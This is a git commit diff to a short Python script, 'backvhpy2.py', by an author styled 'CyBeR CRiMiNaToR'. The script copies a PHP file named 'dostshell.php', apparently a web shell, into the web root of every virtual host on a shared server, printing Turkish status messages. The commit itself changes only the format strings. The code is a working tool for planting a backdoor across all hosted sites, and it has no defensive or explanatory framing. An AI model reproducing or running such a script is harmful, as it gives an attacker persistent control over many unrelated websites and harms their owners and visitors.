76224faa1a21146347e21c53a622b2743157a9f6
CyBeR CRiMiNaToR <52202656+cybercriminator@users.noreply.github.com>
2024-11-23 03:36:28 +0400

    Update backvhpy2.py

--- backvhpy2.py
+++ backvhpy2.py
@@ -6,6 +6,6 @@ source_file = '/var/www/vhosts/dostshell.php'
 for target_dir in glob.glob('/var/www/vhosts/*/httpdocs/'):
     try:
         shutil.copy(source_file, target_dir)
-        print("{} kopyalandi -> {}".format(source_file, target_dir))
+        print("{0} kopyalandi -> {1}".format(source_file, target_dir))
     except Exception as e:
-        print("Hata: {} icine kopyalanamadi. {}".format(target_dir, e))
+        print("Hata: {0} icine kopyalanamadi. {1}".format(target_dir, e))
